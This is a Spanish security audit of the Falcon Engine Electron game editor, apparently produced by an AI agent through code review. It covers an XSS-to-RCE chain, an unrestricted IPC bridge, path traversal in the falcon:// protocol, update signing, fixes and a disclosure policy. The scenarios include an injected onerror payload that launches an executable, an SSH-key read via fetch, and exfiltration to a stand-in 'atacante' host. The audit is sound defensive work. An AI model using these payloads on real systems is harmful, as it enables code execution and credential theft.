# Seguridad de Falcon Engine

Auditoría del 21-11-2026 (agente 08, ciberseguridad), sobre Falcon Engine 1.3.0 con Electron 44.9.0. El trabajo consistió en leer el código. No se ejecutaron pruebas de concepto contra la aplicación. Los números de línea corresponden al árbol de trabajo de esa fecha (commit `db8923f` y los cambios locales sin confirmar).

> **Hay un hallazgo CRÍTICO (C1).** Abrir un proyecto ajeno (una plantilla descargada, un zip de un amigo o un repositorio clonado) puede ejecutar código arbitrario en el equipo con los permisos del usuario. Mientras no se corrija, **los proyectos de terceros deben tratarse como ejecutables**.

## Alcance real

| Área | Ficheros leídos | Profundidad |
|---|---|---|
| Proceso principal de Electron | `src/principal/main.js`, `preload.js`, `jugador.js` | Completa |
| Protocolo `falcon://` | `main.js:43-80`, `jugador.js:104-121` | Completa |
| Exportación y zip | `src/principal/exportar.js` y `@electron/get` (`dist/index.js`, solo la validación) | Completa |
| Actualizaciones | `src/principal/actualizaciones.js`, `electron-builder.config.cjs`, `herramientas/verificar-release.cjs`, `.github/workflows/releases.yml` | Completa. `electron-updater` no está en el `node_modules` local, así que no se leyó su código |
| Carga de proyectos | `src/motor/proyecto.js`, `normalizarNodo` en `src/motor/tipos.js`, `aguilaObtener`, `aguilaAsignar` y las globales de `src/motor/mundo.js` | Parcial: rutas y validación |
| Renderizado de datos del proyecto en el editor | Todas las apariciones de `innerHTML` e `insertAdjacentHTML` en `src/` (grep), revisadas a mano | Parcial: se buscaron interpolaciones sin `esc()` |
| Águila | `src/aguila/interprete.js` (acceso a miembros, índices, llamadas, límites), `biblioteca.js` (`miembrosNativos`) | Las rutas de escape |
| Ara (wasm) | `src/ara/puente.js` (`anfitrion`, carga), `src/ara/ara.mjs:100-140` | Las importaciones del módulo |
| CSP | `src/editor/editor.html`, `src/gestor/gestor.html`, `src/juego/juego.html` | Completa |
| Dependencias | `npm audit --omit=dev` y `npm audit` (salida real en `docs/DEPENDENCIES.md`) | — |

**Fuera de alcance:** el compilador de Ara en Rust (`ara-etapa5/ara`), el cargador GLTF de three.js por dentro, la seguridad de memoria de los `.wasm`, macOS (no hay build), y el resto de `src/editor` y `src/gestor` más allá de los sumideros HTML.

## Modelo de amenazas

- **Activos.** Los archivos del usuario y la ejecución de código en su equipo. También los proyectos de otros (las partidas guardadas) y la cadena de actualizaciones, que llega a todos los usuarios.
- **Fronteras de confianza.**
  1. Un proyecto abierto en el editor: `proyecto.falcon`, `.fscn`, `.bp`, `.mat`, `.malla`, `.falcon/importacion.json` y los scripts `.ara` y `.agl`. Se comparten como plantillas, zips o repositorios, así que son **datos no confiables**.
  2. El renderer y el proceso principal. Hoy el renderer recibe, a través de `window.falcon`, acceso total al disco y a `shell`.
  3. Las releases de GitHub y el auto-actualizador.
  4. Los binarios de Electron descargados para exportar.
- **Atacante típico.** Alguien que reparte un proyecto, una plantilla o un juego de ejemplo. El usuario solo tiene que abrirlo en el editor.

## Hallazgos

Gravedad: **Crítica**, **Alta**, **Media**, **Baja**. Formato: fichero:línea, escenario y corrección.

### C1 · Crítica: XSS persistente en el editor con datos del proyecto, que acaba en ejecución de código

**Dónde.** Varios sitios interpolan en HTML valores leídos de ficheros del proyecto sin pasarlos por `esc()`:
- `src/editor/disposiciones/sencillo.js:70`: `value="${v}"`, donde `v = n.props[p.clave]` sale del `.fscn`. Se pinta con `c.innerHTML` (línea 75).
- `src/editor/disposiciones/sencillo.js:72`: `value="${n.props.ancho}"`.
- `src/editor/paneles/inspector.js:125`: `value="${v}"` en los deslizadores. Pasa por `el()`, es decir, por `template.innerHTML` (`src/ui/componentes.js:6-9`), y el nodo se inserta en el documento.
- `src/editor/acciones.js:310`: `value="${d.resolucion[0]}"`, `value="${d.resolucion[1]}"` y `value="${d.gravedad}"` salen de `proyecto.falcon`.
- `src/editor/acciones.js:332`: `d.volumen?.[k]`.
- `src/editor/disposiciones/recursos.js:396`: `aj.columnas` y `aj.filas` salen de `.falcon/importacion.json`.
- `src/editor/disposiciones/malla.js:72`: `l.distancia` sale del `.malla`.

`normalizarEscena` y `normalizarNodo` (`src/motor/proyecto.js:99-107`, `src/motor/tipos.js:436-449`) rellenan valores por defecto, pero **no validan tipos**: una propiedad numérica puede ser un texto cualquiera. La CSP de las tres páginas lleva `script-src 'self' falcon: 'unsafe-inline'` (`src/editor/editor.html:6`), y eso **permite los manejadores en atributos** (`onerror=`, `onfocus=`).

**Escenario.** El atacante publica una plantilla. Su `proyecto.falcon` lleva `"modo_editor": "sencillo"`, que activa `sencillo.js` (`src/editor/editor.js:36`). Uno de los nodos tiene:

```json
"props": { "velocidad": "1\"><img src=x onerror=\"window.falcon.sistema.abrirUrl('file:///C:/Users/Public/x.exe')\">" }
```

La víctima abre el proyecto y hace clic en el nodo. El HTML inyectado ejecuta JS en el renderer del editor. Desde ahí, `window.falcon` permite:
- `fs.escribir` de cualquier ruta, por ejemplo un `.bat` en `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup`;
- `sistema.abrirUrl('file:///…')`, que llega a `shell.openExternal` sin filtro (`main.js:295`) y lanza el programa;
- `fs.leer` y `fs.listar` de todo el perfil.

Resultado: ejecución de código como el usuario, solo con abrir el proyecto y seleccionar un nodo. No se ejecutó una prueba de concepto. La cadena (sumidero sin escapar, más CSP con `'unsafe-inline'`, más IPC sin restricciones) está verificada leyendo el código.

**Corrección.**
1. Escapar **todas** las interpolaciones: `esc(String(v))` en los sitios citados. Mejor aún, crear los `<input>` con DOM (`input.value = v`) en vez de con plantillas de texto.
2. Validar tipos al cargar. `normalizarNodo` debe forzar `Number()` en las propiedades numéricas según `valoresPorDefecto` y descartar las claves desconocidas. Lo mismo con `datosProyecto`, para `resolucion`, `gravedad` y `volumen`.
3. Quitar `'unsafe-inline'` de `script-src` (mover `editor.js:33`, que usa `onclick=` en línea, a `addEventListener`). Así una inyección HTML no ejecuta script.
4. Aplicar A1: aunque haya una XSS, que no dé acceso al sistema.

### A1 · Alta: el puente IPC da al renderer acceso total al disco y a `shell`

**Dónde.** `src/principal/main.js:201-261` (`fs:leer`, `fs:escribir`, `fs:borrar`, `fs:renombrar`, `fs:copiar`, `fs:listar` y `fs:tamano` aceptan rutas absolutas sin límite), `main.js:217-219` (`fs:borrar` recurre a `fsp.rm(…, { recursive: true, force: true })` si la papelera falla), `main.js:295` (`sistema:abrir-url` pasa a `shell.openExternal` cualquier URL, incluidas `file:` y esquemas de aplicaciones), `main.js:116` (`setWindowOpenHandler` hace lo mismo con cualquier `window.open`), `main.js:339-347` (`exportar` recibe del renderer `destino`, que borra con `rm -rf` en `exportar.js:190`, e `icono`) y `main.js:174` (`app:guardar-datos` sobrescribe `falcon-datos.json` sin esquema). Ningún manejador comprueba `e.sender` ni la URL de quien llama. La ventana de prueba del juego (`juego:probar`, `main.js:304`) usa el mismo `preload.js` completo.

**Escenario.** Cualquier ejecución de JS en un renderer (C1, una dependencia comprometida o un fallo futuro) equivale a control total de la cuenta. Ejemplos: `window.falcon.fs.borrar('C:/Users/<u>/Documents')`, o leer `~/.ssh` y escribir en el inicio de sesión.

**Corrección.**
- Limitar las rutas en el proceso principal a raíces permitidas: el proyecto abierto en esa ventana, `userData` y lo que el usuario eligió en un diálogo de esa sesión. Hay que resolver con `fs.realpath` y comprobar que la ruta cae dentro de la raíz (`jugador.js:105` ya tiene el patrón `dentro()`).
- `sistema:abrir-url` y `setWindowOpenHandler`: admitir solo `https:`, y mejor con una lista de dominios (patreon.com, mixden.net, github.com).
- `exportar`: validar `destino` contra la carpeta elegida en `dialogo:carpeta`.
- Dar a la ventana de juego un preload reducido, como el que ya usa `jugador.js`: lectura dentro del proyecto y nada de escritura ni de `shell`.
- Validar `e.senderFrame.url` (que empiece por `falcon://app/`) en cada manejador.

### A2 · Alta: `falcon://fs/` sirve cualquier archivo del disco y `falcon://app/` permite path traversal

**Dónde.** `src/principal/main.js:46-68`.
- El host `fs` devuelve **cualquier ruta absoluta** (línea 52).
- El host `app` hace `path.join(RAIZ_APP, decodeURIComponent(url.pathname))` (líneas 50-51). Para el parser de URL, `..%2f..%2fx` es un solo segmento y no un `..`, así que sobrevive a la normalización. Una vez decodificado queda `../../x`, y `path.join` sale de `RAIZ_APP`.
- Se añade `Access-Control-Allow-Origin: *` (línea 61), y el esquema está registrado como `secure`, `corsEnabled` y `supportFetchAPI` (línea 17).

**Escenario.** Cualquier contenido que se ejecute en un origen `falcon:` lee archivos arbitrarios con `fetch('falcon://fs/C:/Users/u/.ssh/id_rsa')`. Lo mismo vale para un modelo GLTF cuyo `uri` apunte fuera del proyecto: se carga sin aviso. Hoy no hay canal de salida a la red (la CSP limita `connect-src` a `falcon: data: blob:`), pero C1 sí lo tiene, porque `fs.escribir` y `abrirUrl('https://atacante/?d=…')` pasan por el IPC.

**Corrección.** Resolver con `path.resolve` y `realpath`, y exigir que la ruta esté dentro de `RAIZ_APP` (host `app`) o del proyecto abierto (host `fs`), con la misma comprobación `dentro()` de `jugador.js:105`. Quitar `Access-Control-Allow-Origin: *`.

### M1 · Media: renderers sin sandbox y sin gestor de permisos

**Dónde.** `main.js:98` y `jugador.js:171` tienen `sandbox: false`. No hay ninguna llamada a `session.setPermissionRequestHandler` en `src/principal` (grep). Por defecto, Electron concede los permisos: micrófono, cámara, geolocalización y notificaciones.

**Escenario.** Una XSS (C1), o un juego exportado que muestre contenido inesperado, tiene el renderer completo de Chromium sin sandbox de proceso y puede pedir la cámara o el micrófono sin que aparezca ningún aviso.

**Corrección.** Usar `sandbox: true`. El preload solo usa `contextBridge`, `ipcRenderer`, `webUtils` y `process.platform`, y todo eso está disponible en un preload con sandbox. Añadir `session.defaultSession.setPermissionRequestHandler((wc, permiso, cb) => cb(false))`, con excepciones explícitas si alguna función las necesita (por ejemplo, gamepad no requiere permiso).

### M2 · Media: CSP con `'unsafe-inline'` y sin `object-src` ni `base-uri`

**Dónde.** La etiqueta `<meta http-equiv="Content-Security-Policy">` de `src/editor/editor.html:6`, `src/gestor/gestor.html:6` y `src/juego/juego.html:6`. Lleva `script-src 'self' falcon: 'unsafe-inline' 'wasm-unsafe-eval'`. Falta `object-src 'none'; base-uri 'none'; frame-src 'none'`. Las respuestas de `protocol.handle` no envían CSP en las cabeceras.

**Escenario.** Es lo que convierte la inyección HTML de C1 en ejecución de script.

**Corrección.** Quitar `'unsafe-inline'` de `script-src` (mover el import map a un archivo o usar un hash) y añadir `object-src 'none'; base-uri 'none'; frame-src 'none'`. `'wasm-unsafe-eval'` sí hace falta para Ara.

### M3 · Media: las actualizaciones no tienen firma de código efectiva

**Dónde.**
- `electron-builder.config.cjs`: `win.verifyUpdateCodeSignature: true`, pero no hay certificado (`certificateFile`, `signtoolOptions`, `azureSignOptions`) ni `publisherName`.
- `.github/workflows/releases.yml`: no firma nada.
- Linux: AppImage sin firma.

La integridad depende **solo** del `sha512` de `latest.yml`, que se sirve desde la misma release de GitHub que el binario. `herramientas/verificar-release.cjs` comprueba la coherencia entre el binario y `latest.yml` antes de publicar, pero no autentica nada ante el cliente. Por lo que se sabe de `electron-updater` 6.x, cuando `app-update.yml` no tiene `publisherName`, `verifySignature` se omite. Esto no se ha verificado en este checkout, porque el paquete no está en el `node_modules` local.

**Escenario.** Si alguien compromete la cuenta `MixdenYT`, un `GITHUB_TOKEN` del workflow con `contents: write` o el propio repositorio, sube un `latest.yml` y un `.exe` coherentes, y todos los usuarios instalan código malicioso al aceptar la actualización. Esto ya está mitigado en parte: la descarga y la instalación requieren clic (`autoDownload=false`, `autoInstallOnAppQuit=false`), `allowDowngrade=false`, el workflow es `workflow_dispatch` y los permisos son mínimos por defecto.

**Corrección.** Firmar el instalador de Windows (Authenticode, por ejemplo con Azure Trusted Signing) y fijar `publisherName`. Publicar `SHA256SUMS.txt` firmado (con minisign o GPG). Proteger la rama y las releases: exigir aprobación en el entorno `release` del workflow.

### M4 · Media: Electron 44.9.0 tiene un aviso de gravedad alta y se distribuye dentro de cada juego exportado

**Dónde.** `package.json`, devDependency `electron@^44.9.0` (instalado: 44.9.0). `npm audit` lo marca: GHSA-jr5w-w6x2-84p9, *Mitigation for compromised eMudhra intermediate certificates*, en el rango `44.0.0-alpha.1 - 44.9.0`. Como es una devDependency, `npm audit --omit=dev` **no lo muestra**. Aun así, es el runtime que se distribuye, y `exportar.js:97-98` copia ese mismo `process.execPath` dentro de cada juego exportado.

**Escenario.** Las conexiones TLS de la app (GitHub API y descarga de actualizaciones) confían en certificados intermedios que se sabe que están comprometidos. Los juegos ya exportados se quedan con el runtime viejo para siempre.

**Corrección.** Actualizar a la versión de Electron 44 que corrige el aviso, revisando primero el changelog. Hacer que `npm audit` sin `--omit=dev` sea obligatorio en CI, porque aquí Electron es una dependencia de ejecución.

### B1 · Baja: la exportación sigue enlaces simbólicos del proyecto

**Dónde.** `src/principal/exportar.js:76-89`. `copiar` usa `fsp.stat`, que sigue los enlaces, y copia el contenido del destino. Pasa lo mismo con `compilarAra` (`exportar.js:44-51`).

**Escenario.** Un proyecto clonado de un repositorio (en Linux, git crea symlinks) contiene `recursos/x.png -> ~/.ssh/id_rsa`. El usuario exporta y publica el juego, y el archivo privado va dentro.

**Corrección.** Usar `fsp.lstat` y omitir los enlaces, o exigir que `realpath` quede dentro del proyecto.

### B2 · Baja: el proyecto puede leer rutas absolutas fuera de su carpeta

**Dónde.** `src/motor/proyecto.js:121`: `abs(rel)` devuelve tal cual cualquier ruta que contenga `:` o empiece por `/`, y no normaliza `..` (`unir`, línea 32). Lo usan las referencias de escena, las texturas, los modelos y `cambiar_escena` (`mundo.js:352`, que lleva a `cargarEscena`).

**Escenario.** En el editor, un script hace `cambiar_escena("C:/Users/u/archivo.json")`: el archivo se lee y se interpreta como escena. No hay canal de salida desde el script, así que el impacto es bajo. En el juego exportado, `jugador.js:105` lo bloquea.

**Corrección.** En `abs()`, rechazar las rutas absolutas y los `..`. Las referencias deben quedarse relativas al proyecto.

### B3 · Baja: las partidas guardadas se comparten entre proyectos del editor

**Dónde.** `src/motor/mundo.js:397`: la clave es `'falcon:' + nombre_del_proyecto + ':' + k`, en el `localStorage` del origen único `falcon://app`.

**Escenario.** Un proyecto que se llame igual que otro lee y sobrescribe sus partidas guardadas durante las pruebas en el editor.

**Corrección.** Usar como clave un identificador estable del proyecto, por ejemplo un UUID guardado en `proyecto.falcon`.

### B4 · Baja: la caché del runtime de exportación no se vuelve a verificar

**Dónde.** `src/principal/exportar.js:100-103`. Si `cache-exportacion/electron-<v>-<plat>/electron(.exe)` existe, se reutiliza sin comprobar su hash.

**Escenario.** Un atacante local que ya puede escribir en `userData` contamina todos los juegos que se exporten después. Necesita acceso previo a la cuenta.

**Corrección.** Guardar el SHA-256 al descomprimir y comprobarlo al reutilizar.

### B5 · Baja: guiones de prueba que se ejecutan desde argumentos y variables de entorno

**Dónde.** `main.js:380-383` (`--captura=… --guion=archivo.js` ejecuta JS en el editor, que tiene el IPC completo) y `jugador.js:185-193` (las variables `FALCON_GUION` y `FALCON_CAPTURA` existen también en los juegos distribuidos).

**Escenario.** Hace falta controlar la línea de comandos o el entorno, y quien los controla ya puede ejecutar código. No es una escalada real, pero es superficie que no hace falta distribuir.

**Corrección.** Activarlo solo cuando `!app.isPackaged`, o detrás de una variable de compilación.

### B6 · Baja: Ara no tiene límite de pasos

**Dónde.** Águila corta los bucles infinitos (`src/aguila/interprete.js:120,137`, con 2.000.000 de pasos por evento). En `src/ara/puente.js` no se encontró nada equivalente para el wasm de Ara.

**Escenario.** Un script `.ara` con un bucle infinito cuelga el renderer del editor o del juego. Es una denegación de servicio local y la pérdida se limita a lo que no se haya guardado.

**Corrección.** Ejecutar el juego en un Worker con un watchdog, o meter un contador de combustible en el código que genera el compilador de Ara.

## Comprobado sin hallazgos

- **`contextIsolation: true` y `nodeIntegration: false`** en todas las ventanas (`main.js:98`, `jugador.js:171`). El preload solo expone funciones, nunca `ipcRenderer` en crudo (`preload.js:10-76`).
- **Navegación del editor:** `will-navigate` bloquea todo lo que no sea `falcon://` (`main.js:118`). El juego exportado no tiene `will-navigate`, pero los scripts no pueden navegar (ver Águila).
- **Águila no puede salir del sandbox.** El acceso a miembros pasa por `miembro`, `indice` y `asignarMiembro` (`interprete.js:403-414` y `520-563`). Solo admite `ObjetoAguila`, `Map` y los objetos con `aguilaObtener` y `aguilaAsignar`, que usan listas blancas con `switch` y `hasOwnProperty` (`mundo.js:194-226`), además de los métodos fijos de listas y textos (`biblioteca.js:242-297`). No hay manera de llegar a `constructor`, `__proto__`, `window` ni `Function`. Hay límites de 2.000.000 de pasos y 250 niveles de recursión.
- **Ara (wasm) solo ve las importaciones del anfitrión** (`puente.js:251-366`): propiedades y métodos de nodo con la misma lista blanca que Águila, y globales del intérprete de Águila. WebAssembly no tiene otra salida. En los juegos exportados, el `.falcon/ara.wasm` precompilado tiene la misma superficie.
- **Zip-slip al descomprimir Electron** (`exportar.js:120-164`). Se rechazan las entradas con `..` (línea 136), se usa `path.join` (las rutas absolutas no salen del destino) y yauzl 2.10 valida los nombres por defecto. Los symlinks no se crean en disco: se anotan y se reproducen dentro del `.tar.gz`. `@electron/get` 5.1.0 valida contra `SHASUMS256.txt` (`dist/index.js:20-31`) salvo que se pase `unsafelyDisableChecksums`, y aquí no se pasa.
- **IPC de actualizaciones.** Solo responde al gestor (`actualizaciones.js:137-140`). El repositorio se valida con una expresión regular (línea 7). El token solo vive en el proceso principal y los errores no filtran cabeceras.
- **Juego exportado.** `jugador.js` limita `fs:leer`, `fs:existe` y `fs:listar` a la carpeta del juego con `dentro()` (línea 105), y no expone escritura, borrado ni `shell`, salvo en `setWindowOpenHandler`, que los scripts no pueden alcanzar.
- **GLTF y recursos remotos:** `connect-src falcon: data: blob:` impide cargar `uri` de red desde un modelo.

## Riesgos conocidos y aceptados

- Los scripts de un proyecto se ejecutan al pulsar «Jugar». Están limitados a la API del motor (ver arriba), pero **un proyecto ajeno sigue siendo código ajeno**: puede gastar CPU (B6) y manipular sus propias partidas.
- `node_modules` está versionado en git (3.383 archivos rastreados). CI instala desde el lockfile con `npm ci`, pero el árbol versionado no se verifica contra el lockfile. Ver `docs/DEPENDENCIES.md`.
- `asar: false` y la instalación por usuario (`perMachine: false`): cualquier proceso del usuario puede modificar los archivos de la app. Es lo normal en una instalación por usuario.
- Los juegos exportados llevan el Electron del editor y no se actualizan solos.

## Prioridad de corrección

1. C1: escapar los siete sumideros y validar tipos al cargar. Es un parche pequeño y corta la cadena.
2. A1 y A2: rutas permitidas en el IPC y en `falcon://`, y `abrirUrl` solo con `https:`.
3. M1 y M2: `sandbox: true`, gestor de permisos y CSP sin `'unsafe-inline'`.
4. M4: subir Electron. M3: firma de código.
5. Los hallazgos B.

## Política de divulgación

- Las vulnerabilidades se comunican **en privado**, mediante *Security advisories* de GitHub en `MixdenYT/Falcon-engine` (pestaña Security, «Report a vulnerability»). No se abren issues públicos.
- Hay que incluir la versión, la plataforma, los pasos y, si se puede, un proyecto mínimo que lo reproduzca.
- Objetivo: acuse de recibo en 7 días y corrección o plan en 90 días. Después de publicar la corrección se divulga de forma coordinada, con crédito para quien lo reportó si lo desea.
- Solo hay soporte de seguridad para la última versión publicada.
